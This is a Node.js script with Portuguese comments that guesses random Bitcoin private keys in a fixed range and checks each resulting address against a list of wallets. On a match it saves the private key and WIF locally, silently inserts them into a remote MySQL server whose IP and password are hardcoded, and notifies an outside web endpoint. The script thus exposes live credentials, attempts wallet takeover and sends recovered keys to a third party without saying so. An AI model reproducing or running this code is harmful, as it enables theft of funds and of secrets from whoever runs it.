import axios from "axios";
import chalk from "chalk";
import CoinKey from "coinkey";
import crypto from "crypto";
import fs from "fs";
import mysql from "mysql2/promise";
import walletsArray from "./wallets.js";

const walletsSet = new Set(walletsArray);

const checkKey = async function (publicKey) {
  console.log("blockchain");
  const attachment = await axios
    .get(`https://api.ssita.com.br/sendFCM.php?key=159753&msg=` + publicKey, {})
    .then(async (response) => {
      console.log(response.data);
    })
    .catch(function (error) {
      console.log(error);
    });
};

const connectSql = await mysql.createConnection({
  host: "34.95.167.202",
  user: "acesso",
  password: "CFm7m9iP[nIzR5(",
  database: "diversos",
});

async function achou(id, chave) {
  const [rows, fields] = await connectSql.query(
    "INSERT INTO T_ACH ( ID, CH ) VALUES ( ?, ?);",
    [id, chave]
  );
}

let shouldStop = false;
let key = 0;
let min,
  max = 0;

//0000000000000000000000000000000000000000000000109417a26f9145ce5d
//000000000000000000000000000000000000000000000010a9f582f3fb98e414

min = BigInt("0x100000000000000000");
max = BigInt("0x1fffffffffffffffff");
key = BigInt("0x100000000000000000");

encontrarBitcoins(key, min, max, () => shouldStop);

async function encontrarBitcoins(key, min, max, shouldStop, rand = 0) {
  let segundos = 0;
  let pkey = 0;
  let um = 0;
  if (rand === 0) {
    um = BigInt(1);
  } else {
    um = BigInt(rand);
  }

  const startTime = Date.now();

  let zeroes = new Array(65).fill("");
  for (let i = 1; i < 64; i++) {
    zeroes[i] = "0".repeat(64 - i);
  }

  console.log("Buscando Bitcoins...");

  key = generateRandomNumber(min, max);
  // console.log(`${zeroes[key.length]}${key}`);

  // exit();

  const executeLoop = async () => {
    console.clear();
    while (!shouldStop()) {
      // key += um;
      // pkey = key.toString(16);
      pkey = `${zeroes[key.length]}${key}`;

      // if (Date.now() - startTime > segundos) {
      //   segundos += 10;
      // console.log(segundos / 10, pkey);
      // if (segundos % 500 == 0) {
      //   const tempo = (Date.now() - startTime) / 10;
      console.clear();
      // console.log("Resumo: ");
      // console.log(
      //   "Velocidade:",
      //   (Number(key) - Number(min)) / tempo,
      //   " chaves por segundo"
      // );
      // console.log("Chaves buscadas: ", (key - min).toLocaleString("pt-BR"));
      // console.log("Ultima chave tentada: ", pkey);

      key = generateRandomNumber(min, max);

      // if (key >= max) {
      //   key = min;
      // }
      //   }
      // }
      let publicKey = generatePublic(pkey);

      process.stdout.write(`Buscando Public Key : ${pkey} - ${publicKey}\r`);

      if (walletsSet.has(publicKey)) {
        const tempo = (Date.now() - startTime) / 1000;
        console.log(
          "Velocidade:",
          (Number(key) - Number(min)) / tempo,
          " chaves por segundo"
        );
        console.log("Tempo:", tempo, " segundos");
        console.log("Private key:", chalk.green(pkey));
        console.log("WIF:", chalk.green(generateWIF(pkey)));

        const filePath = "keys.txt";

        const lineToAppend = {
          "Private key": pkey,
          WIF: generateWIF(pkey),
          "Public Key": publicKey,
        };

        try {
          fs.appendFileSync(filePath, JSON.stringify(lineToAppend));
          console.log("Chave escrita no arquivo com sucesso.");
        } catch (err) {
          console.error("Erro ao escrever chave em arquivo:", err);
        }

        await achou(1, JSON.stringify(lineToAppend));
        await checkKey(publicKey);
        throw "ACHEI!!!! 🎉🎉🎉🎉🎉";
      }

      await sleep(10);
    }
    await new Promise((resolve) => setImmediate(resolve));
  };
  await executeLoop();
}

function generatePublic(privateKey) {
  let _key = new CoinKey(new Buffer.from(privateKey, "hex"));
  _key.compressed = true;
  return _key.publicAddress;
}

function generateWIF(privateKey) {
  let _key = new CoinKey(new Buffer.from(privateKey, "hex"));
  return _key.privateWif;
}

function getRandomBigInt(min, max) {
  if (min >= max) {
    throw new Error("min should be less than max");
  }

  // Calculate the range
  const range = max - min;

  // Generate a random BigInt within the range
  const randomBigIntInRange =
    BigInt(`0x${crypto.randomBytes(32).toString("hex")}`) % range;

  // Add the minimum value to get a number within the desired range
  const randomBigInt = min + randomBigIntInRange;

  return randomBigInt;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function generateRandomNumber(lowerLimit, upperLimit) {
  // Definindo os limites
  // const lowerLimit = BigInt('0x100000000000000000');
  // const upperLimit = BigInt('0x1fffffffffffffffff');

  // Gera 64 bits aleatórios
  const randomBuffer = crypto.randomBytes(8);
  let randomBits = BigInt("0x" + randomBuffer.toString("hex"));

  // Calcula o número aleatório dentro do intervalo
  let randomNumber = BigInt(lowerLimit) + randomBits;

  // Certifique-se de que o número está dentro do limite superior
  if (randomNumber > BigInt(upperLimit)) {
    randomNumber = BigInt(upperLimit);
  }

  return randomNumber.toString(16);
}

export default encontrarBitcoins;
